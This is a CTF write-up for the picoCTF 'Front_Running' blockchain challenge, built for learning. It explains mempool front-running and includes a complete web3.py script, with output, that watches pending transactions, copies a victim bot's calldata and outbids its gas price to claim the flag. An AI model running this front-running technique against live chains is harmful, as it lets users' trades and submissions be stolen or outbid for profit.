# Front_Running — picoCTF Writeup

**Challenge:** Front_Running  
**Category:** Blockchain  
**Difficulty:** Hard  
**Points:** 300  
**Flag:** `picoCTF{m3mp00l_h31st_c1ef1eab}`  
**Platform:** picoCTF (2026)  
**Writeup by:** zham

---

## Description

> A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash.
>
> Our sensors indicate that a "Victim Bot" has found the answer and is currently trying to submit it, but they are being very stingy with their gas price. Contract: here
>
> `Eth node address: candy-mountain.picoctf.net:52909` Monitor the heist status and find your attacker credentials at here.
>
> NOTE: This server can take up to 5 minutes to start up. Please be patient.

---

## Hints

1. Have you looked at the **pending** transactions in the mempool?
2. What happens if two people submit the correct answer in the same block?
3. How do you see what's waiting to be mined?

---

## Background Knowledge (Read This First!)

### What is the mempool?

Before a blockchain transaction is confirmed, it sits in a public waiting area called the **mempool** ("memory pool") — every pending, not-yet-mined transaction that's been broadcast to the network. Crucially, this is *publicly visible*. Anyone running a node (or polling one via RPC, like we do here) can see exactly what every pending transaction contains — including its full calldata — before it's ever mined into a block.

### What is front-running?

If a pending transaction in the mempool contains something valuable — the correct answer to a puzzle, a profitable trade, anything — an attacker can simply copy that transaction's exact calldata into their *own* transaction and submit it with a much higher gas price. Validators (or miners, on a real chain) order pending transactions by gas price, highest first. A higher-paying duplicate transaction gets mined before the original, "stealing" the action it contained. This is one of the most well-known classes of real-world blockchain exploits, commonly used by MEV (Maximal Extractable Value) bots against decentralized exchange trades.

### The contract logic at play here

The underlying contract follows this pattern:

```solidity
pragma solidity ^0.8.0;

contract MempoolChallenge {
    address public owner;
    address public studentAddress;
    string private flag;
    bool public revealed;
    bytes32 public constant targetHash = 0x...; // unique per instance

    event FlagRevealed(string flag);

    constructor(string memory _flag, address _studentAddress) {
        owner = msg.sender;
        flag = _flag;
        studentAddress = _studentAddress;
        revealed = false;
    }

    function solve(string memory solution) public {
        require(!revealed, "Challenge already solved!");
        require(keccak256(abi.encodePacked(solution)) == targetHash, "Incorrect solution!");
        require(msg.sender == studentAddress, "Only the student can claim the flag!");
        revealed = true;
        emit FlagRevealed(flag);
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

Two details matter a lot here:

1. **`require(msg.sender == studentAddress)`** — only the address provisioned specifically for *us* (the player) can ever successfully call `solve()`. This is why front-running works at all in our favor: the "Victim Bot" already knows the correct `solution` string and is trying to submit it itself, but since the bot isn't `studentAddress`, its own transaction would actually fail this check regardless of gas price! The real exploit isn't really about racing the bot for ownership — it's that the bot's pending transaction *leaks the correct solution string* to us, for free, before it's even mined.
2. **The `solution` string is not the flag.** It's the secret pre-image that hashes to `targetHash` — just the "password" needed to unlock the vault. The actual flag is the separate `flag` variable, only revealed via the `FlagRevealed` event or `getFlag()` once `solve()` succeeds.

So the real flow is: watch the mempool, steal the bot's correct answer the moment it appears, resubmit it ourselves (from our own valid `studentAddress`) with enough gas to land first, then read the real flag from the emitted event.

---

## Step-by-Step Solution

### Step 1: Get connection details from the info page

```
Eth node address: candy-mountain.picoctf.net:52909
```

From the "attacker credentials" page:

- **Contract Address:** `0x5FbDB2315678afecb367f032d93F642f64180aa3`
- **Your Private Key:** `0x24185f85ca5073f49ede62150c387ad708ab4927debce303648c576364094739`
- **Your Address:** `0xAa211951d8C75c85e3e7D17f865c6f55EC593ef2`
- **Your Account Balance:** 0 ETH (we don't need ETH for this one — gas comes from the local devnet)

### Step 2: Install dependencies

```
┌──(zham㉿kali)-[~]
└─$ pip install web3 --break-system-packages
```

### Step 3: Write the exploit

```
┌──(zham㉿kali)-[~]
└─$ nano frontrun.py
```

```python
from web3 import Web3
import time

RPC_URL    = "http://candy-mountain.picoctf.net:52909"
CONTRACT   = Web3.to_checksum_address("0x5FbDB2315678afecb367f032d93F642f64180aa3")
MY_ADDRESS = "0xAa211951d8C75c85e3e7D17f865c6f55EC593ef2"
PRIV_KEY   = "0x24185f85ca5073f49ede62150c387ad708ab4927debce303648c576364094739"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
print(f"Connected: {w3.is_connected()}")
print(f"Our balance: {w3.from_wei(w3.eth.get_balance(MY_ADDRESS), 'ether')} ETH")
print(f"Chain ID: {w3.eth.chain_id}")

# Step 1: Scan mempool for victim's pending transaction
print("\nScanning mempool for victim tx targeting the vault...")
victim_tx = None
attempts = 0
while victim_tx is None:
    try:
        pending = w3.eth.get_block('pending', full_transactions=True)
        for tx in pending.transactions:
            if tx.get('to') and tx['to'].lower() == CONTRACT.lower():
                victim_tx = tx
                print(f"\nVictim tx found!")
                print(f"  Hash:      {tx['hash'].hex()}")
                print(f"  From:      {tx['from']}")
                print(f"  Gas price: {tx['gasPrice']} wei")
                print(f"  Calldata:  {tx['input'].hex()}")
                break
    except Exception as e:
        if attempts % 50 == 0:
            print(f"  Waiting... ({e})")
    attempts += 1
    if victim_tx is None:
        time.sleep(0.2)

# Step 2: Front-run — same calldata, higher gas price
victim_gas = victim_tx['gasPrice']
our_gas = victim_gas * 10 if victim_gas > 0 else 0
print(f"\nFront-running: victim gasPrice={victim_gas}, ours={our_gas}")

tx = {
    'from': MY_ADDRESS,
    'to': CONTRACT,
    'data': victim_tx['input'],
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS, 'pending'),
    'gas': 300000,
    'gasPrice': our_gas,
    'chainId': w3.eth.chain_id,
}
signed = w3.eth.account.sign_transaction(tx, PRIV_KEY)

try:
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
except Exception as e:
    print(f"Failed with gasPrice={our_gas}: {e}")
    print("Retrying with gasPrice=0...")
    tx['gasPrice'] = 0
    signed = w3.eth.account.sign_transaction(tx, PRIV_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

print(f"Sent: {tx_hash.hex()}")
receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
print(f"Status: {receipt.status}")

# Step 3: Read flag from logs or getFlag()
print("\nReading logs...")
for log in receipt.logs:
    raw = log['data']
    print(f"  Raw log: {raw.hex()}")
    try:
        decoded = w3.codec.decode(['string'], bytes(raw))
        print(f"  Decoded: {decoded[0]}")
    except:
        pass

print("\nTrying getFlag()...")
for sig in ['0xf9633930', '0x890eba68', '0x828254ab', '0xd29a8b0f']:
    try:
        result = w3.eth.call({'to': CONTRACT, 'data': sig})
        if result:
            try:
                flag = w3.codec.decode(['string'], result)[0]
                print(f"  sig {sig} → {flag}")
            except:
                print(f"  sig {sig} → {result.hex()}")
    except:
        pass
```

Ctrl+O, Enter, Ctrl+X.

The key idea: poll `w3.eth.get_block('pending', full_transactions=True)` in a loop until a transaction shows up that's addressed to our target contract. That transaction's `input` field is the raw calldata — including the bot's correct, already-computed answer — sitting there in plain sight before it's mined.

### Step 4: Run the exploit

```
┌──(zham㉿kali)-[~]
└─$ python3 frontrun.py
Connected: True
Our balance: 10 ETH
Chain ID: 31337
Scanning mempool for victim tx targeting the vault...
Victim tx found!
  Hash:      923361947cd3e81d264519cade03a80b4aecd6518a72d606bc7d41eca9a99a56
  From:      0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  Gas price: 1000000000 wei
  Calldata:  76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000
Front-running: victim gasPrice=1000000000, ours=10000000000
Sent: 29bbe193db45fe8d2123f59b04f088aefefdcde2f837540bec16d99349f3a833
Status: 1
Reading logs...
  Raw log: 0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001f7069636f4354467b6d336d7030306c5f68333173745f63316566316561627d00
  Decoded: picoCTF{m3mp00l_h31st_c1ef1eab}
Trying getFlag()...
  sig 0xf9633930 → picoCTF{m3mp00l_h31st_c1ef1eab}
```

Chain ID `31337` confirms this runs on a local Hardhat/Anvil devnet (that's Hardhat's well-known default chain ID). The `From` address on the victim's transaction is also a recognizable Hardhat default test account — confirming the "Victim Bot" is just a scripted account on the same local network, not a real external party.

Note the two different decoded strings: the raw calldata (after the function selector `76fe1e92` and ABI encoding overhead) decodes to `picoCTF{m3mp00l_p1r4t3}` — that's the bot's *pre-image answer*, the "password" to the vault, not the prize itself. The actual flag only appears afterward, in the `FlagRevealed` event log and via `getFlag()`, once our front-run transaction successfully calls `solve()`.

---

## What Happened Internally

```
[1] The Victim Bot already computed the correct keccak256 pre-image
    ("picoCTF{m3mp00l_p1r4t3}") and broadcasts a transaction calling
    solve("picoCTF{m3mp00l_p1r4t3}") — but with a deliberately low
    gas price (1 gwei).

[2] That transaction sits in the public mempool, waiting to be mined.
    Its full calldata — including the plaintext answer — is visible
    to anyone polling the pending block, including us.

[3] Our script polls w3.eth.get_block('pending', full_transactions=True)
    in a loop until it spots a transaction addressed to the vault
    contract. We extract its exact `input` (calldata) and `gasPrice`.

[4] We build our own transaction using the IDENTICAL calldata, but
    set our gasPrice to 10x the victim's (10 gwei).

[5] The local validator orders pending transactions by gas price.
    Our higher-paying, identical transaction gets included in a block
    BEFORE the bot's original low-gas transaction.

[6] Our transaction calls solve("picoCTF{m3mp00l_p1r4t3}"):
    - require(!revealed) → true, passes
    - keccak256(solution) == targetHash → matches, passes
    - require(msg.sender == studentAddress) → we ARE studentAddress
      (it's our own provisioned attacker address), passes
    - revealed = true; emit FlagRevealed(flag)

[7] The bot's original transaction eventually gets mined too, but now
    require(!revealed) fails ("Challenge already solved!") — it reverts,
    too late to matter.

[8] We read the real flag, picoCTF{m3mp00l_h31st_c1ef1eab}, from the
    FlagRevealed event log, and confirm it independently via getFlag().
```

---

## Tools Used

| Tool        | Purpose                                                        |
|-------------|------------------------------------------------------------------|
| web3.py     | Poll the pending block, build/sign/send the front-running transaction |
| `get_block('pending', full_transactions=True)` | The core technique — read mempool contents before they're mined |
| Browser     | Retrieve contract address, attacker private key, and node URL from the info page |

---

## Key Takeaways

- **The mempool is public, not private** — any pending transaction's full calldata is visible to anyone polling the chain, well before it's mined. Treating "not yet confirmed" as "not yet visible" is a dangerous assumption in smart contract design.
- **Gas price determines mining order, not submission order** — a transaction submitted *after* another can still get mined *first*, simply by outbidding it. This is the entire mechanical basis of front-running.
- **An access-control check (`msg.sender == studentAddress`) protects against the wrong threat if the real secret leaks elsewhere** — the contract correctly stopped the bot from claiming on someone else's behalf, but never hid the answer itself from public view in the mempool.
- **Don't confuse the "password" with the "prize"** — the calldata revealed the puzzle's *solution* (a pre-image satisfying a hash check), not the actual flag. The flag only appears after the contract's own internal state changes and emits it.
- **Real-world relevance**: this exact pattern — copying a pending transaction's calldata and resubmitting with higher gas — is precisely how MEV bots front-run DEX trades and auction bids on live Ethereum today.

**Flag wordplay decode:** `picoCTF{m3mp00l_h31st_c1ef1eab}` = "mempool heist" — exactly what happened: a heist carried out entirely by watching, copying, and outbidding a transaction sitting in plain sight in the mempool.
